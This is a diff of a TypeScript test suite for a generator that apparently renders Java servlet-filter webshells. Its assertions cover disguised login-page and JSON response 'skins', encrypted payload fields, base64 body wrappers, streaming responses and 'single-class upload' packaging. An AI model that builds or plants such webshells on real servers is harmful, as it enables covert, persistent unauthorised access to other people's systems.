@@ -8,7 +8,9 @@ const base = {
   pass: "p@ss",
   secret: "kéy",
   fields: ["verCode", "X-Token"],
-  templates: ['<html><body>登录"页"\n©</body></html>'],
+  bodyContentTypes: ["json"],
+  templates: [{ template: '<html><body>登录"页"\n©</body></html>', contentType: "text/html;charset=UTF-8" }],
+  wrapper: { bodyB64: "V1JBUFBFUg==", streamB64: "U1RSRUFN" },
 };
 
 describe("javaStringLiteral", () => {
@@ -65,6 +67,36 @@ describe("renderFilterJava", () => {
     const tplLine = src.split("\n").find((l) => l.includes("\\u767b"))!;
     expect(tplLine.trim().startsWith('"')).toBe(true);
     expect(tplLine.trim().endsWith('"')).toBe(true);
+  });
+
+  it("renders per-template content types and the placeholder + JSON-body plumbing", () => {
+    const src = renderFilterJava({
+      ...base,
+      templates: [
+        { template: '<html><body>a</body></html>', contentType: "text/html" },
+        { template: '{"code":0,"data":"{{payload}}"}', contentType: "application/json" },
+      ],
+      cipher: LEGACY_CIPHER,
+    });
+    expect(src).toContain('CTS = { "text/html", "application/json" }');
+    expect(src).toContain('page = tpl.replace("{{payload}}", payload);');
+    expect(src).toContain("static String jsonField(String body, String field)");
+    expect(src).toContain("static String multipartField(String body, String field)");
+    expect(src).toContain("static String xmlField(String body, String field)");
+    expect(src).toContain('WRAPPER_B64 = "V1JBUFBFUg=="');
+    expect(src).toContain("wrapBody(httpReq, bodyBytes)");
+    // bodies are read only for the profile's own Content-Types (allowlist —
+    // reading anything else would consume a body the shell doesn't own)
+    expect(src).toContain('BODY_CTS = { "json" }');
+    expect(src).toContain("ctMatches(ct)");
+    expect(src).toContain("multipartField(bodyText, f)");
+    expect(src).toContain("xmlField(bodyText, f)");
+    // SSE skins stream chunk by chunk
+    expect(src).toContain('tplCt.contains("event-stream")');
+    expect(src).toContain("response.flushBuffer()");
+    expect(src).toContain("response.setContentType(tplCt);");
+    // the wrapper must NOT be a compile-time inner class (single-class upload)
+    expect(src).not.toContain("static class CachedBody");
   });
 });
 
